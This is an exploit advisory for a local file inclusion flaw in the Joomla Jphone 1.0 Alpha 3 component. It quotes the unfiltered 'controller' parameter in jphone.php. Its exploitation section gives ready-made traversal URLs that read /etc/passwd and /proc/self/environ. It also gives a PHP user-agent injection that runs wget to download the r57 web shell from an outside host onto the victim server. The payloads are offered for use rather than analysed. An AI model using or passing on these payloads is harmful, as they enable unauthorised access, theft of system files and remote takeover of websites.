I. BACKGROUND

Called Jphone, component agency 4you studio allows for your Joomla adapted mobile
version with a real interface using page transition effects rather pro
(the cube effect and popup are very nice).

Consisting of a component and a plugin for Joomla, it is after activating the plugin
define a menu (the menu management of Joomla). This is to link the specific component
to display your content. Currently seen by the articles, categories, sections are set
but also those contacts and links Web (Two native Joomla components).
The installation procedure is shown in the download package.

In addition, the proposed version is an alpha version
(therefore usable only for testing purposes) but resulted entirely in French.
Feel free to share your opinion on the forum.
Support for Android and PalmPre should be functional (not tested)

II. DESCRIPTION

Some Local File inclusion vulnerabilities exist in Component Joomla Jphone 1.0 Alpha 3.



III. ANALYSIS

The bug is in the following files, specifying the lines

/components/com_jphone/jphone.php



[63] if($controller = JRequest::getVar('controller')) {
[64]
[65]	require_once (JPATH_COMPONENT.DS.'controllers'.DS.$controller.'.php');

 Explanation:As noted in the line [65] $controller
 nowhere is filtered, which result is lfi as is known to pass '.php' use %00 :)


IV. EXPLOITATION

http://site/path/index.php?option=com_jphone&controller={LFI}
{LFI}=../../../../../../../../../../etc/passwd%00
{LFI}=../../../../../../../../../../proc/self/environ%00

changing the user agent for something so:
<?system('wget http://chipdebios.com/r57.txt -O r57.php');?>

A special greeting to my good friends:
